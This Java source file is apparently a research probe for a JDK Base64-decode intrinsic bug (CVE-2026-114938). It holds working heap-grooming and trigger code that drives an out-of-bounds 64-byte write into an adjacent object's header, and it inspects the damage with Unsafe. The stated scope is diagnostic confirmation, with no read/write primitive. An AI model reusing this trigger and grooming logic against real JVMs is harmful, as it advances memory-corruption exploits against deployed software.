import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.Arrays;
import java.util.Base64;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.lang.reflect.Field;
import jdk.internal.misc.Unsafe;

/**
 * MechProbe — CVE-2026-114938 INTERMEDIATE-MECHANISM confirmation (diagnostic/forensic).
 *   Scope: observe OOB write -> adjacent live object HEADER corruption, byte-exact, on the
 *   real vulnerable build (Method A). NO value/sign control, NO read/write primitive, NO
 *   disclosure, NO code execution. See research/mechanism/MECH-PLAN.md.
 *
 *   Reuses OobCanary's proven humongous gap grooming verbatim; replaces the length-only scan
 *   with a full header snapshot/diff via jdk.internal.misc.Unsafe:
 *     mark(0..7) | narrowKlass(8..11) | length(12..15) | body(16..) read as RAW words, so a
 *     smashed klass does not need to be dereferenced. Pristine snapshot (fill time) vs post-trigger.
 *   Run with: --add-opens java.base/jdk.internal.misc=ALL-UNNAMED
 *
 * Stub-level analysis (jdk-17.0.21.0.3 stubGenerator_x86_64.cpp L_finalBit):
 *   remaining r<4 bytes with p trailing pads → output_size = (r/4)*3 - p = -p (underflow)
 *   → bzhiq(output_mask, -1, -p): index = low 8 bits (255/254) >= 64 → source kept → mask = all-ones
 *   → 64-byte masked store at dest+dp; logical overrun = dp+64-dstLen (pad1: 62B, pad2: 63B)
 *   [corrected 2026-11-23, CORRECTION-3.md C-1/C-2 — previous comment used a wrong mod-64 model]
 *
 * Recipe: humongous dst sized to land exactly in a 4-region gap; the next live
 * humongous canary gets the tail of the 64-byte store at its region start (header+data).
 *
 * Modes:
 *   gap  <pad1|pad2> <nFillers> <gcLog>  — humongous gap grooming + canary scan
 *   segv <pad1|pad2>                      — fresh small-heap OOB probe (SIGSEGV watch)
 * Exit: 42 = OOB observed, 0 = clean, 1 = aborted/no-cycle
 */
public class MechProbe {
    static final int REGION = 1024 * 1024;          // run with -XX:G1HeapRegionSize=1m
    static final int GAP_REGIONS = 5;
    static final int FILLER = GAP_REGIONS * REGION - 16;   // byte[FILLER] object = exactly 5 regions
    // trigger k: 4k ≡ 0 (mod 64) so stub final-bit r=2 (<4, bug path), and
    // dst=3k+1 lands its object in 5 regions with the write crossing the gap end:
    //   write [obj+16+3k, +64) = [5242864, 5242928) vs gap end 5242880 → 48B canary hit (16B header + 32B data)
    static final int TRIG_K = 16 * ((GAP_REGIONS * REGION - 76 + 47) / 48); // = 1747616
    static final byte CANARY = (byte) 0xAA;
    static final Pattern CYCLE_DONE = Pattern.compile("Concurrent Mark Cycle .*ms");
    static byte[][] fillers;
    static boolean[] dropped;
    static int nFillers;

    public static void main(String[] args) throws Exception {
        String mode = args.length > 0 ? args[0] : "gap";
        String trig = args.length > 1 ? args[1] : "pad2";
        nFillers = args.length > 2 ? Integer.parseInt(args[2]) : 150;
        String gcLog = args.length > 3 ? args[3] : "/tmp/gc.log";

        System.out.println("[*] MechProbe — CVE-2026-114938 intermediate-mechanism confirmation (Method A)");
        System.out.println("[*] java.version=" + System.getProperty("java.version")
                + " vm=" + System.getProperty("java.vm.name"));
        System.out.println("[*] input args: " + Arrays.toString(RuntimeArgs(args)));
        System.out.println("[*] region=" + REGION + " gap=" + GAP_REGIONS + "R filler=" + FILLER
                + " TRIG_K=" + TRIG_K + " (dst=" + (3 * TRIG_K + 1) + "/" + (3 * TRIG_K + 2)
                + ", write starts at obj+" + (16 + 3 * TRIG_K) + ", gap end " + GAP_REGIONS * REGION + ")");

        // dst-length formula self-checks (returns are trimmed lengths):
        //   "A"*8        → 3*(8/4) = 6
        //   "A"*8+"AB"   → 3*((10+3)/4)-2 = 7
        //   "A"*8+"BB==" → 3*((12+3)/4)-2 = 7  (valid padded group "BB==")
        try {
            int p1 = Base64.getDecoder().decode("AAAAAAAA".getBytes(StandardCharsets.ISO_8859_1)).length;
            int p2 = Base64.getDecoder().decode("AAAAAAAAAB".getBytes(StandardCharsets.ISO_8859_1)).length;
            int p3 = Base64.getDecoder().decode("AAAAAAAABB==".getBytes(StandardCharsets.ISO_8859_1)).length;
            boolean ok = p1 == 6 && p2 == 7 && p3 == 7;
            System.out.println("[*] probes: 8A→" + p1 + " (6), 8A+AB→" + p2 + " (7), 8A+BB==→" + p3
                    + " (7) " + (ok ? "OK" : "MISMATCH — formula drift, abort"));
            if (!ok) { System.exit(1); return; }
        } catch (IllegalArgumentException e) {
            System.out.println("[!] probe threw: " + e.getMessage());
            System.exit(1); return;
        }

        if ("segv".equals(mode)) { segvRun(trig); return; }
        gapRun(trig, gcLog, args);
    }

    static String[] RuntimeArgs(String[] args) { return args; }

    static void warmupDecode() {
        // Interleave all decode0 branch shapes from call #1 — profile mixes BEFORE
        // tier4 compiles, preventing uncommon-trap deopt when the trigger enters
        // the slow path. (w1-only warmup made tier4 decode0 deopt at trigger time.)
        byte[] w1 = "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=".getBytes(StandardCharsets.ISO_8859_1); // fast path consumes all
        byte[] w2 = ("A".repeat(4096) + "AB").getBytes(StandardCharsets.ISO_8859_1);               // slow path + shiftto==6 (1B tail)
        byte[] w3 = ("A".repeat(4096) + "ABC").getBytes(StandardCharsets.ISO_8859_1);              // slow path + shiftto==0 (2B tail)
        byte[] w4 = ("A".repeat(4096) + "AB==").getBytes(StandardCharsets.ISO_8859_1);             // slow path + pad break (valid 4-char padded group)
        byte[][] shapes = {w1, w2, w3, w4};
        long acc = 0;
        for (int i = 0; i < 240_000; i++) {
            try { acc += Base64.getDecoder().decode(shapes[i & 3]).length; }
            catch (IllegalArgumentException e) { /* unexpected on valid input */ }
        }
        // NOTE: deliberately NO invalid-shape (throwing) warmup calls — an IAE thrown
        // through the compiled decode0's unprofiled throw path fires an uncommon trap
        // and deopts tier4 decode0 before the trigger runs (observed: decode0
        // "made not entrant" at warmup end → trigger interpreted → no stub).
        // The trigger's own IAE throws AFTER the stub has already written OOB.
        System.out.println("[*] decode warmup done: 240K interleave, acc=" + acc
                + " (C2 hot, no deopt expected)");
    }

    static byte[] buildTrigger(String trig) {
        // pad1: "A"*(4k)+"="   → len%4=1, r=1, 1 pad  → 64B store, dst=3k+2 → logical overrun 62B
        // pad2: "A"*(4k)+"=="  → len%4=2, r=2, 2 pads → 64B store, dst=3k+1 → logical overrun 63B
        // Both: 4k ≡ 0 (mod 64) → r<4 (bug path); dst obj = 5 regions = gap fit.
        int k = TRIG_K;
        StringBuilder sb = new StringBuilder(4 * k + 2);
        char[] chunk = new char[1 << 16];
        Arrays.fill(chunk, 'A');
        int left = 4 * k;
        while (left > 0) {
            int n = Math.min(left, chunk.length);
            sb.append(chunk, 0, n);
            left -= n;
        }
        sb.append("pad1".equals(trig) ? "=" : "==");
        return sb.toString().getBytes(StandardCharsets.ISO_8859_1);
    }

    static int cycleCount(String gcLog) {
        try {
            String s = new String(Files.readAllBytes(Path.of(gcLog)), StandardCharsets.ISO_8859_1);
            Matcher m = CYCLE_DONE.matcher(s);
            int n = 0;
            while (m.find()) n++;
            return n;
        } catch (Exception e) { return -1; }
    }

    /** Pump young garbage until one more concurrent mark cycle completes (or timeout). */
    static boolean pumpForCycle(String gcLog, long timeoutMs, int pumpCapMB, String label) throws Exception {
        int before = cycleCount(gcLog);
        System.out.println("[*] " + label + ": cycles before=" + before);
        if (before < 0) { System.out.println("[!] gc log unreadable: " + gcLog); return false; }
        long deadline = System.currentTimeMillis() + timeoutMs;
        long pumped = 0;
        byte[] chunk = new byte[256 * 1024];
        int extraCycles = 0;
        while (System.currentTimeMillis() < deadline) {
            for (int i = 0; i < 64; i++) { chunk[0]++; pumped += chunk.length; } // keep chunk live
            byte[] trash = new byte[1 << 20]; trash[0] = 1;                      // 1MB young garbage
            pumped += trash.length;
            int now = cycleCount(gcLog);
            if (now > before) { extraCycles = now - before; before = now; break; }
            if (pumped > pumpCapMB * 1024L * 1024L) break;
            Thread.sleep(20);
        }
        int after = cycleCount(gcLog);
        System.out.println("[*] " + label + ": pumped≈" + (pumped >> 20) + "MB, cycles after=" + after
                + (after > 0 && after > before - extraCycles ? "" : " (no new cycle — proceeding best-effort)"));
        return after > 0;
    }

    static void gapRun(String trig, String gcLog, String[] args) throws Exception {
        System.out.println("[*] mode=gap trig=" + trig + " nFillers=" + nFillers);

        // 0. C2 warmup — the intrinsic fires ONLY from C2-compiled decode0.
        //    Without this, the trigger decode runs interpreted (Java path, no OOB).
        warmupDecode();

        // 1. live humongous fillers
        fillers = new byte[nFillers][];
        dropped = new boolean[nFillers];
        for (int i = 0; i < nFillers; i++) {
            fillers[i] = new byte[FILLER];
            Arrays.fill(fillers[i], CANARY);
        }
        System.out.println("[*] " + nFillers + " fillers allocated ("
                + (nFillers * 4) + " regions)");

        // 2. establish concurrent cycle behavior
        pumpForCycle(gcLog, 60_000, 3000, "warmup-pump");

        // 3. drop one filler → gap of exactly 4 regions
        int dropIdx = nFillers / 2;
        fillers[dropIdx] = null;
        dropped[dropIdx] = true;
        System.out.println("[*] dropped filler[" + dropIdx + "] → 4-region gap; canary=fillers[" + (dropIdx + 1) + "]");

        // 4. reclaim the gap via a concurrent cycle (no compaction)
        pumpForCycle(gcLog, 90_000, 3000, "gap-reclaim-pump");

        // 5. trigger: dst=byte[3k+1 or 2] (object exactly 5 regions) → lands in the gap
        byte[] src = buildTrigger(trig);
        int dstExpect = "pad1".equals(trig) ? 3 * TRIG_K + 2 : 3 * TRIG_K + 1;
        System.out.println("[*] trigger src=" + src.length + " bytes (4k+"
                + ("pad1".equals(trig) ? 1 : 2) + ", k=TRIG_K), dst expect " + dstExpect
                + " (object→5 regions)");
        long t0 = System.nanoTime();
        try {
            byte[] r = Base64.getDecoder().decode(src);
            System.out.println("[!] decode returned " + r.length + " (unexpected accept)");
        } catch (IllegalArgumentException e) {
            System.out.println("[*] decode threw IAE (expected) after "
                    + ((System.nanoTime() - t0) / 1_000_000) + "ms");
        }

        // 6. METHOD A: full header snapshot/diff of the hit canary (read BEFORE any GC
        //    touches the smashed header). Raw word reads so a corrupted klass is never
        //    dereferenced. Pristine values captured at fill time (all-0xAA body, live header).
        int canaryIdx = dropIdx + 1;
        byte[] canary = fillers[canaryIdx];
        Unsafe U = unsafe();
        final long BASE = Unsafe.ARRAY_BYTE_BASE_OFFSET;   // 16 on 64-bit compressed
        System.out.println("[*] layout: ARRAY_BYTE_BASE_OFFSET=" + BASE + " (mark@0,8B klass@8,4B length@12,4B body@" + BASE + ")");

        // after-trigger raw header + first 64 body bytes
        long markA = U.getLong(canary, 0L);
        int  klassA = U.getInt(canary, 8L);
        int  lenA  = U.getInt(canary, 12L);
        byte[] bodyA = new byte[64];
        for (int i = 0; i < 64; i++) bodyA[i] = U.getByte(canary, BASE + i);

        // pristine reference: a FRESH sibling canary of identical shape/content, untouched by
        // the trigger, read the same way → its header/body = the pristine baseline.
        byte[] ref = new byte[FILLER]; Arrays.fill(ref, CANARY);
        long markP = U.getLong(ref, 0L);
        int  klassP = U.getInt(ref, 8L);
        int  lenP  = U.getInt(ref, 12L);

        System.out.println("[*] mark   : pristine=0x" + Long.toHexString(markP) + "  post=0x" + Long.toHexString(markA)
                + (markP == markA ? "  (unchanged)" : "  ★CHANGED★"));
        System.out.println("[*] klass  : pristine=0x" + Integer.toHexString(klassP) + "  post=0x" + Integer.toHexString(klassA)
                + (klassP == klassA ? "  (unchanged)" : "  ★CHANGED★"));
        System.out.println("[*] length : pristine=" + lenP + "  post=" + lenA
                + (lenP == lenA ? "  (unchanged)" : "  ★CHANGED (sign " + (lenA < 0 ? "negative" : "positive") + ")★"));

        // byte-exact change map over [0..63] (header 0..15 + body 0..47). Pristine header bytes
        // from the sibling ref; pristine body = CANARY (0xAA).
        byte[] hdrP = new byte[16];
        for (int i = 0; i < 8; i++)  hdrP[i] = (byte) (markP >>> (8 * i));
        for (int i = 0; i < 4; i++)  hdrP[8 + i] = (byte) (klassP >>> (8 * i));
        for (int i = 0; i < 4; i++)  hdrP[12 + i] = (byte) (lenP >>> (8 * i));
        int firstChg = -1, lastChg = -1, nChg = 0;
        StringBuilder diff = new StringBuilder();
        for (int off = 0; off < 64; off++) {
            byte pv = off < 16 ? hdrP[off] : CANARY;
            byte av = off < 16 ? (byte) (off < 8 ? (markA >>> (8 * off))
                                         : off < 12 ? (klassA >>> (8 * (off - 8)))
                                         : (lenA >>> (8 * (off - 12))))
                               : bodyA[off - 16];
            if (pv != av) {
                if (firstChg < 0) firstChg = off; lastChg = off; nChg++;
                String fld = off < 8 ? "mark" : off < 12 ? "klass" : off < 16 ? "length" : "body[" + (off - 16) + "]";
                diff.append(String.format("  off=%2d %-9s %02x -> %02x%n", off, fld, pv & 0xff, av & 0xff));
            }
        }
        System.out.println("[*] changed-byte map over object offsets [0..63] (header 0..15, body 16..63):");
        System.out.print(diff);
        System.out.println("[*] changed bytes: n=" + nChg + " span=[" + firstChg + ".." + lastChg + "]"
                + (firstChg >= 0 ? " width=" + (lastChg - firstChg + 1) + "B" : ""));
        System.out.println("[*] canary deep-offset sanity (1MiB,2MiB raw): "
                + (U.getByte(canary, BASE + (1L << 20)) == CANARY && U.getByte(canary, BASE + (1L << 21)) == CANARY ? "intact" : "DAMAGED"));

        boolean observed = nChg > 0 || lenP != lenA || klassP != klassA || markP != markA;
        if (observed) {
            System.out.println("VERDICT: MECHANISM-OBSERVED (adjacent header corrupted; fields="
                    + (markP != markA ? "mark " : "") + (klassP != klassA ? "klass " : "")
                    + (lenP != lenA ? "length " : "") + (nChg > 0 ? "+body" : "") + ")");
            // METHOD B: on a fastdebug JDK run with -XX:+VerifyBeforeGC/+VerifyAfterGC, force a
            // GC so the heap verifier WALKS the heap and reports the corrupted object by address
            // (the VM itself names it — the deterministic version of "GC steps on it"). No-op
            // evidence-wise on a product build (verifier not compiled in). Arg: "verifygc".
            boolean verifygc = false;
            for (String a : args) if ("verifygc".equals(a)) verifygc = true;
            if (verifygc) {
                System.out.println("[*] METHOD B: forcing GC for heap verifier (fastdebug VerifyBeforeGC/AfterGC)...");
                System.out.flush();
                for (int k = 0; k < 3; k++) { System.gc(); try { Thread.sleep(800); } catch (InterruptedException ie) {} }
                System.out.println("[*] survived 3 System.gc() — verifier did not fault on the corrupted object");
            }
            System.exit(42);
        } else {
            System.out.println("VERDICT: CLEAN (no header change in this layout)");
            System.exit(0);
        }
    }

    static Unsafe unsafe() throws Exception {
        Field f = Unsafe.class.getDeclaredField("theUnsafe");
        f.setAccessible(true);
        return (Unsafe) f.get(null);
    }

    static int scanCorrupted(byte[] b, int limit) {
        for (int i = 0; i < limit; i++) if (b[i] != CANARY) return i;
        return -1;
    }

    static String hex(byte[] b, int off, int len) {
        StringBuilder sb = new StringBuilder();
        for (int i = off; i < off + len && i < b.length; i++)
            sb.append(String.format("%02x", b[i]));
        return sb.toString();
    }

    /** Fresh JVM, minimal commit: dst humongous may sit at the committed edge → PROT_NONE → SIGSEGV. */
    static void segvRun(String trig) throws Exception {
        System.out.println("[*] mode=segv — decoding immediately on a fresh small-commit heap");
        byte[] src = buildTrigger(trig);
        System.out.println("[*] trigger src=" + src.length + " bytes");
        try {
            byte[] r = Base64.getDecoder().decode(src);
            System.out.println("[!] decode returned " + r.length);
        } catch (IllegalArgumentException e) {
            System.out.println("[*] decode threw IAE (expected)");
        }
        System.out.println("[*] survived — OOB absorbed by committed heap (no SIGSEGV this run)");
        System.exit(0);
    }
}
